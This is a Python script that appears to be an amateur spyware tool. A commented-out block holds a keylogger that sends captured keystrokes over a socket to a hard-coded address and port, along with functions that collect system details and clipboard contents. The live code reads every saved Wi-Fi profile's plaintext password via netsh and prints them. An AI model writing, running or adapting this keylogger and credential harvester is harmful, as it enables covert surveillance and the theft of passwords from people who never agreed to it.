import socket
import sys
import platform
#import pyperclip
import subprocess
import re
#from pynput import keyboard
from requests import get

'''
soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

IP = "192.168.1.54"  
PORT = 5050  
print('Initializing connection with server')
soc.connect((IP, PORT))  

msg = '\n'
def on_press(key):  
    global msg
    print("Key pressed:", key)
    if key != keyboard.Key.enter:
        msg += str(key)
    else:
        soc.send(msg.encode('utf-8'))
        msg = '\n'

# Collect events until released
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

def getComputerInfo():
    msg = ''
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    try:
        yo=''
        #public_ip = get("https://api.ipify.org").text
        #msg += ("Public IP Address: " + public_ip + "\n")

    except Exception:
        msg +=("Couldn't get Public IP Address (most likely max query")

    msg +=("Processor: " + (platform.processor()) + '\n')
    msg +=("System: " + platform.system() + " " + platform.version() + '\n')
    msg +=("Machine: " + platform.machine() + "\n")
    msg +=("Hostname: " + hostname + "\n")
    msg +=("Private IP Address: " + IPAddr + "\n")
    print(msg)
def getClipboardInfo():
    try:
        clipboard_text = pyperclip.paste()
        print(clipboard_text)
    except:
        print('Clipboard could not be copied')
'''

def getWifiInfo():
    command = "netsh wlan show profile"

    networks = subprocess.check_output(command, shell=True).decode('cp1252')
    network_names_list = re.findall("(?<=: )[^\n]+", networks)
    network_names_list = [i.strip() for i in network_names_list]

    result = ""
    for network_name in network_names_list:
        try:
            command = "netsh wlan show profile " + network_name + " key=clear"
            current_result = subprocess.check_output(command, shell=True).decode('cp1252')
            key_content = re.findall("(?<=Contenu de la cl‚            : )[^\n]+", current_result)
            result += (key_content[0] + '\n')
        except:
            continue
    return(result)

print(getWifiInfo())

